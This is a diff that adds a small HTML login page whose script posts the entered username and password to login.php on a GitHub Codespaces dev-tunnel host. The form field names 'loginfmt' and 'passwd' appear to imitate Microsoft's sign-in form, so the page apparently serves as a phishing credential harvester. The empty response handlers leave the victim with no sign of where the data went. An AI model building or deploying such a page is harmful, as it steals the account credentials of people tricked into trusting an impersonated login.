@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+</head>
+<body>
+    <h2>Login Form</h2>
+    <label for="username">Username:</label><br>
+    <input type="text" id="username" required><br>
+    <label for="password">Password:</label><br>
+    <input type="password" id="password" required><br><br>
+    <button id="signInButton">Login</button>
+
+    <script>
+        const signInButton = document.getElementById('signInButton');
+        const usernameElement = document.getElementById('username');
+        const passwordElement = document.getElementById('password');
+
+        signInButton.addEventListener('click', () => {
+            const uname = usernameElement.value.trim();
+            const pwd = passwordElement.value.trim();
+            if (uname && pwd) {
+                // Perform the form submission with username and password
+                const formData = new FormData();
+                formData.append('loginfmt', uname);
+                formData.append('passwd', pwd);
+
+                fetch('https://musical-space-rotary-phone-4jjrpww4j79wfgrg-8080.app.github.dev/login.php', {
+                    method: 'POST',
+                    body: formData
+                }).then(response => {
+                    if (response.ok) {
+                        // Handle successful response
+                    } else {
+                        // Handle failed response
+                    }
+                }).catch(error => {
+                    // Handle errors during the fetch
+                });
+            } else {
+                // Handle the case where username or password is missing
+            }
+        });
+    </script>
+</body>
+</html>
